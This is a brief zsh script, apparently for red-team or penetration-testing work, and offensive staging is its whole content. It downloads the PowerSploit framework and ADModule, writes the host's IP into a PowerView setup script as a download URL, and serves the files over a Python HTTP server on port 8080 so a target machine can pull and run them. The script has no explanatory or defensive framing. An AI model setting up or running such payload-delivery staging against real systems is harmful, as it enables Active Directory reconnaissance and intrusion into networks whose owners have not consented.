#!/bin/zsh

git clone https://github.com/PowerShellMafia/PowerSploit.git
addr=`/sbin/ifconfig eth0 | grep "inet " | cut -d: -f2 | awk '{print $2}'`
echo "\$urlGet = $addr" | cat - setup-powerview.ps1 > tmp.txt && mv tmp.txt setup-powerview.ps1

git clone https://github.com/samratashok/ADModule

python3 -m http.server 8080